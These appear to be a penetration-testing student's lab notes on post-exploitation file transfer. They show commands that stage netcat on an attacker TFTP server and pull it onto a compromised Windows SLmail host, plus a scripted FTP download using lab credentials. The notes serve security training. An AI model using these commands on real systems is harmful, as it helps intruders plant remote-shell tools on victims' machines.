#File Transfers (Post Exploitation)

## TFTP
Often restricted in corperate networks, contained in windows up to xp/2003 by default has since has been opt in
+ Quick to setup, non-interactive

Linux Box (attacker)
```
root@kali:# mkdir /tftp
root@kali:# atftpd --daemon --port 69 /tftp
root@kali:# cp /usr/share/windows-binaries/nc.exe /tftp/
```

Windows Box (defender)
```
C:\Program Files\SLmail\System>tftp -i 10.11.0.138 GET nc.exe
   tftp -i 10.11.0.138 GET nc.exe
   Transfer successful: 59392 bytes in 18 second(s), 3299 bytes/s
```

## FTP
Often included in windows, has interactive elements so might need to prewrite a script

Linux Box (attacker) - install pure-ftpd, then run `setup-ftp.sh`
```
root@kali:~/Desktop/lessons/slmail# apt-get install pure-ftpd
root@kali:~/Desktop/lessons/filetransfers# ./setup-ftp.sh 
```

Windows Box (defender) - Paste `ftp.txt` into the shell
```
C:\Program Files\SLmail\System>echo offsec>> ftp.txt
C:\Program Files\SLmail\System>echo lab>> ftp.txt
C:\Program Files\SLmail\System>echo bin>> ftp.txt
C:\Program Files\SLmail\System>echo GET test.txt>> ftp.txt
C:\Program Files\SLmail\System>echo bye>> ftp.txt
C:\Program Files\SLmail\System>ftp -s:ftp.txt
```

## VBScript

## Powershell